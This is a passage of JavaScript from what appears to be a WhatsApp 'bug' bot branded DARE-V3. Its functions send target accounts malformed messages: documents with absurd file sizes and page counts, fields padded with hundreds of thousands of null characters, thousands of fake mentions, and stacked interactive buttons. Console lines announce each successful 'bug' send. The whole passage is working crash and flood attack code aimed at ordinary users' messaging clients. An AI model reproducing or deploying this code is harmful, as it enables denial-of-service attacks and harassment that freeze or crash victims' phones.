									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн 𝐁𝐔𝐆 𝐕𝟐👑️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await Dare.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function GlX(X, Ptcp = true) {
			await Dare.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн👑️",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RizxzNewtech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function GlxCall(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎𝐃𝐀𝐑𝐄-𝐕𝟑ㄈ尺Λらн👑️"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑 \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝐃𝐀𝐑𝐄-𝐕𝟑尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await Dare.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁👑"));
		};

		async function GlxCallX(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐃𝐀𝐑𝐄-𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 👑 \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️" + "᬴".repeat(0) + "\",\"sections\":[{\"title𝐃𝐀𝐑𝐄-𝐕𝟑尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐂𝐫𝐚𝐬𝐡 👑👑️\",\"sections\":[{\"title𝐃𝐀𝐑𝐄-𝐕𝟑尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞👑ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"👑️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await Dare.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁 👑"));
		};

		async function TxOs(X, Ptcp = false) {
			await Dare.relayMessage(X, {
					extendedTextMessage: {
						text: "⭑̤⟅̊༑ 𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "␵␵␵␵␵〜␵␵␵␵␵␵␵〪␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵␵".repeat(15000),
						contextInfo: {
							mentionedJid: [
								"62895364760801@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: X,
							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈👑",
								body: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5 𝐈𝐬 𝐇𝐞𝐫𝐞 👑",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://www.instagram.com/WhatsApp",
								mediaUrl: "https://www.instagram.com/WhatsApp",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://www.instagram.com/WhatsApp"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("𝐃𝐀𝐑𝐄-𝐕𝟑 Succes Send Bug By ©𝐁.𝐌.𝐁👑"));
		};
		
		//SPAMMING FLOODS\\
		const VxO = "🔥⃰͜͡⭑𝐃𝐀𝐑𝐄-𝐕𝟑⭑͜͡🔥⃰" + "\u0000".repeat(50000)

		//REVISION\\
		async function LIVELOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "p",
							"caption": `🍷꙰͜͡𝐃𝐀𝐑𝐄-𝐕𝟑💸` + "\u0000".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			})
			await Dare.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🔥፝⃟ ꙳𝐃𝐀𝐑𝐄-𝐕𝟑🔥፝⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await Dare.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await Dare.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
							}
						}, {
							upload: Dare.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ©𝐃𝐀𝐑𝐄-𝐕5!!"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await Dare.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		//QUOTED ZAP\\
		const dottm = {
			key: {
				fromMe: false,
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					orderId: '999999999999',
					thumbnail: null,
					itemCount: 999999999999,
					status: 'INQUIRY',
					surface: 'CATALOG',
					message: '𝐃𝐀𝐑𝐄-𝐕𝟑χ ⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 ▾',
					token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
				}
			},
			contextInfo: {
				mentionedJid: ['27746135260@s.whatsapp.net'],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		
		const NullNihBos = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "𝐃𝐀𝐑𝐄-𝐕𝟑𓍯𓂃",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    
    async function FloodsCarousel(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/e13gja.jpg" } },
          { upload: Dare.waUploadToServer }
        )),
        title: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𓍯𓂃" + "\u0000".repeat(100000),
        subtitle: "𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "\u0000".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " ⃟⃟⃟⃟l𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟ ",
            rows: [
              {
                title: "𝐃𝐀𝐑𝐄-𝐕𝟑𓍯𓂃",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " 𓍯𓂃 ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
          {
            title: "𝐃𝐀𝐑𝐄-𝐕𝟑𓍯𓂃",
            rows: [
              {
                title: "⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟⃟⃟",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
        ],
      };

      await Dare.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: NullNihBos
              },
            }
          : {}
      );
    }
    
    async function Mym(target, Ptcp = false) {
      await Dare.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "⃟⃟⃟⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟⃟" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
